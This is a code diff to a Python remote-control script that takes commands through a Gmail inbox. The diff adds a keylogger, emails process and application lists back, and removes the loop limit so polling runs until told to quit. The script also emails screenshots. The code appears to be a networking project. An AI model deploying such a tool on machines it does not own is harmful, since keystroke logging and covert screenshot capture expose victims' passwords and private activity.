@@ -9,6 +9,7 @@ from email.header import decode_header
 import screenshot
 import shutdown
 from process_app import *
+from keylogger import *
 
 server = 'imap.gmail.com'
 username_receiver = 'mangmaytinhremotecontrol@gmail.com'
@@ -44,9 +45,17 @@ def send_email(sender, receiver, subject, body, image_data=None):
 
 def CheckAndDo(cmd):
     if (cmd == 'applications'):
-        print(execute_msg(cmd))
+        send_email(username_receiver, username_sender,
+                   "List of applications:", execute_msg(cmd))
+    elif (cmd == 'processes'):
+        send_email(username_receiver, username_sender,
+                   "List of processes:", execute_msg(cmd))
+    elif ('Start' in cmd):
+        send_email(username_receiver, username_sender,
+                   "List of processes:", execute_msg(cmd))
     elif (cmd == 'keylogger'):
-        print('keylogger: A, B, C, D')
+        # duration of keylogger
+        print(get_key_log(cmd))
     elif (cmd == 'screenshot'):
         image_data = screenshot.screen_shot()
         send_email(username_receiver, username_sender,
@@ -81,9 +90,6 @@ while cmd != 'quit':
     imap.close()
 
     time.sleep(0.4)
-    cnt += 1
-    if cnt > 40:
-        cmd = 'quit'
 
 print("Byee")
 
